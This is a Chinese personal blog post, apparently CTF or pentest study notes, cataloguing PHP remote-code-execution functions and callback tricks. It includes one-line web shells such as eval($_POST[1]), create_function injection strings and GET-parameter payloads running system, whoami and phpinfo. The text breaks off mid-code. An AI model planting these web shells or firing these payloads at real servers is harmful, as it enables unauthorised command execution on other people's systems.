<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/favicon.ico">
  
  <title>rce(上) | Err0r233</title>
  <meta name="author" content="Err0r2333" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="基础漏洞" />
  
  <meta name="description" content="有关一些php和linux命令执行的知识">
<meta property="og:type" content="article">
<meta property="og:title" content="rce(上)">
<meta property="og:url" content="http://example.com/posts/49224.html">
<meta property="og:site_name" content="Err0r233">
<meta property="og:description" content="有关一些php和linux命令执行的知识">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/favicon.ico">
<meta property="article:published_time" content="2023-11-07T09:56:28.000Z">
<meta property="article:modified_time" content="2024-05-15T11:43:46.000Z">
<meta property="article:author" content="Err0r2333">
<meta property="article:tag" content="基础漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/favicon.ico">
  
  <!-- 站点验证相关 -->
  
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner3.png');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/bizhiaaaaa.png');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
</head>



    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                        
                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
                                        
                                    
                                        
                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
                                        
                                    
                                        
                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
                                        
                                    
                                        
                                            <li>
                                                <a><i class="fa fa-link"></i>链接</a>
                                                <ul class="sub-menu">
                                                    
                                                        
                                                    
                                                </ul>
                                            </li>
                                        
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">Err0r233</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>Err0r233</h2> <br />
                        <span>Err0r233的个人博客</span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/49224.html">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">rce(上)</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2023-11-07T09:56:28.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-11-07</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~24.78K
                    
                    字
                </li>
                
                    <li id="/posts/49224.html" class="leancloud_visitors" data-flag-title="rce(上)">
                        <i class="fa fa-eye"></i>
                        <span class="leancloud-visitors-count"> </span> 次阅读
                    </li>
                    
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1715773426000"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><p>有关一些php和linux命令执行的知识</p>
<span id="more"></span>
<h1><span id="rce"> RCE</span></h1>
<h2><span id="php命令执行"> PHP命令执行</span></h2>
<h3><span id="eval"> eval</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">assert</span>(<span class="string">&quot;eval(\$_POST[1]);&quot;</span>));</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>
<h3><span id="assert"> assert</span></h3>
<p>同eval</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<ul>
<li>php 7.2 前，assert是一个函数，可以使用可变函数调用</li>
</ul>
<p>可变函数：<strong>如果一个变量名后面有圆括号，PHP将寻找与变量的值同名的函数，并且尝试执行它</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;In foo() &lt;br/&gt;\n&quot;</span>;</span><br><span class="line">&#125;  </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"><span class="variable">$arg</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;In bar(), argument was &#x27;<span class="subst">$arg</span>&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">echoit</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>();<span class="comment">//会调用foo()</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="variable">$bar</span>(<span class="string">&#x27;test&#x27;</span>);<span class="comment">//会调用bar()</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;echoit&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;string&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>php 7.2 后，assert与eval一样，不是函数而是语言构造器</li>
</ul>
<h3><span id="create_function"> create_function</span></h3>
<p>具体可以看看php特性篇，讲述了create_function的注入</p>
<p>但是挺可惜的，create_function在php7之后就被移除了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="comment">/*相当于 function func()&#123;</span></span><br><span class="line"><span class="comment">$_POST[&#x27;a&#x27;];</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">然后调用*/</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>WordPress &lt;= 4.6.1 的rce漏洞就是利用了create_function触发</p>
</blockquote>
<p>如果没有的话我们也可以这么写：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;2;&#125;system(dir);/*&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(...<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>如果是命令注入，无需调用，直接写：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;echo 123;&#125;system(&#x27;</span>ls<span class="string">&#x27;);//&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3><span id="call_user_funccall_user_func_array"> call_user_func/call_user_func_array</span></h3>
<p><code>call_user_func('a','b');</code></p>
<p>相当于<code>a(b);</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;$_POST[1]&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;phpinfo&#x27;</span>, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p><code>call_user_func_array</code>，需要后面一个变成数组：</p>
<p>例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="number">1</span>], <span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//1=system&amp;2[]=ls</span></span><br></pre></td></tr></table></figure>
<h3><span id="array_walk"> array_walk</span></h3>
<p><code>array_walk(a, b)</code></p>
<p>其中a是数组，相当于调用<code>b(a)</code>：</p>
<p>array_walk使用用户自定义函数对数组中的每个元素做回调处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="number">1</span>], <span class="variable">$GET</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//1[]=ls &amp; 2=system</span></span><br><span class="line"><span class="comment">//1[]=phpinfo()&amp;2=assert</span></span><br></pre></td></tr></table></figure>
<h3><span id="array_map"> array_map</span></h3>
<p><code>array_map(a, b)</code></p>
<p>其中b是数组，相当于调用<code>a(b)</code>：</p>
<p>array_map为数组的每个元素应用回调函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="number">1</span>], <span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//1=system&amp;2[]=whoami</span></span><br><span class="line"><span class="comment">//1=assert&amp;2=phonifo();</span></span><br><span class="line"><span class="comment">//$array = array(0,1,2,3,4,5);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//array_map($_GET[1], $array);</span></span><br><span class="line"><span class="comment">//1 = phpinfo()</span></span><br></pre></td></tr></table></figure>
<h3><span id="array_filter"> array_filter</span></h3>
<p><code>array_filter(array $array[, callable $callback [, int $flag =0]])</code></p>
<p>array_filter()会用回调函数过滤数组中的单元，依次将array数组中的每个值传递到callback函数，如果该函数返回了true，则array的数组当前值会被包含在返回的结果数组中，数组的键名保留不变：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]));</span><br><span class="line"><span class="comment">//func = system &amp; cmd = whoami</span></span><br><span class="line"><span class="comment">//func = assert &amp; cmd = phpinfo()</span></span><br></pre></td></tr></table></figure>
<p>例如执行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;system&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;ls&#x27;</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">run</span></span><br><span class="line"><span class="comment">script.php</span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(10) &quot;script.php&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">此时数组的当前值就是执行的结果，数组的键名仍然是0保持不变</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>相当于调用<code>b(a)</code></p>
<h3><span id="array_reduce"> array_reduce</span></h3>
<p>用回调函数将数组化为单一的值，第一个参数是数组，第二个是回调函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>([<span class="number">1</span>], <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>([<span class="number">1</span>], <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">run</span></span><br><span class="line"><span class="comment">script.php</span></span><br><span class="line"><span class="comment">string(10) &quot;script.php&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3><span id="array_diff_ukeyarray_diff_uassoc"> array_diff_ukey/array_diff_uassoc</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_diff_ukey</span>([<span class="string">&#x27;whoami&#x27;</span>=&gt;<span class="string">&#x27;&#x27;</span>],[<span class="string">&#x27;&#x27;</span>=&gt;<span class="string">&#x27;&#x27;</span>],<span class="string">&#x27;system&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3><span id="array_intersect_ukeyarray_intersect_uassoc"> array_intersect_ukey/array_intersect_uassoc</span></h3>
<p>同上</p>
<h3><span id="usort"> usort</span></h3>
<p><code>usort()</code>函数将用户自定义的比较函数对一个数组中的值进行排序：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//version &lt; 5.6</span></span><br><span class="line">    <span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>, <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">	<span class="comment">//?1=1&amp;2=whoami</span></span><br><span class="line">	<span class="comment">//1=1 &amp; 2 = phpinfo()</span></span><br><span class="line">	<span class="comment">//version &gt; 5.6</span></span><br><span class="line">	<span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);<span class="comment">//会报毒</span></span><br><span class="line">	<span class="comment">//1[] = 1 &amp;1[] = whoami &amp; 2 = system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3><span id="ob_start"> ob_start()</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cmd</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>(<span class="variable">$cmd</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$_GET</span>[1]&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="comment">//a = ls</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3><span id="preg_replace-e模式"> preg_replace /e模式</span></h3>
<p>这个在之前的每日一题出现过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>/e</code>在php7已经不支持，php5.5已经弃用</p>
<p>可以执行第二个参数的内容，换句话说这里可以执行<code>strtolower(&quot;\\1&quot;);</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>一般来说是利用<code>.*</code>的，但是php的get此请求一般传不了<code>.</code></p>
<p>所以我们改用<code>\S*</code>来代替</p>
<p>换句话讲其实是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### $</span><br><span class="line"></span><br><span class="line">`$&#123;&#125;`能直接调用函数内容：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>${phpinfo()}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### header_register_callback</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">header_register_callback(&#x27;phpinfo&#x27;);</span><br></pre></td></tr></table></figure>
<p>无参数的callback</p>
<h2><span id="php函数"> PHP函数</span></h2>
<h3><span id="passthru-system"> passthru、system</span></h3>
<p>两个函数等效：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<h3><span id="execshell_exec"> exec/shell_exec</span></h3>
<p>执行但不会回显，需要echo</p>
<h2><span id="pcntl_exec"> pcntl_exec</span></h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3><span id="popen"> popen</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">	<span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>popen打开一个指向进程的管道，该进程由派生给定的command命令执行</p>
<h3><span id="proc_open"> proc_open</span></h3>
<p><code>proc_open</code>的例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">	<span class="variable">$array</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="comment">//标准输入</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="comment">//标准输出内容</span></span><br><span class="line">        <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="comment">//标准输出错误</span></span><br><span class="line">    );</span><br><span class="line">	<span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>, <span class="variable">$array</span>, <span class="variable">$pipes</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);<span class="comment">//从输出内容通道获取内容</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其实就是执行一个命令，并且打开管道输入、输出内容</p>
<p>另一个来自php官方手册的例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// 标准输入，子进程从此管道中读取数据</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// 标准输出，子进程向此管道中写入数据</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;/tmp/error-output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="comment">// 标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cwd</span> = <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line"><span class="variable">$env</span> = <span class="keyword">array</span>(<span class="string">&#x27;some_option&#x27;</span> =&gt; <span class="string">&#x27;aeiou&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;php&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>, <span class="variable">$cwd</span>, <span class="variable">$env</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    <span class="comment">// $pipes 现在看起来是这样的：</span></span><br><span class="line">    <span class="comment">// 0 =&gt; 可以向子进程标准输入写入的句柄</span></span><br><span class="line">    <span class="comment">// 1 =&gt; 可以从子进程标准输出读取的句柄</span></span><br><span class="line">    <span class="comment">// 错误输出将被追加到文件 /tmp/error-output.txt</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="string">&#x27;&lt;?php print_r($_ENV); ?&gt;&#x27;</span>);</span><br><span class="line">    <span 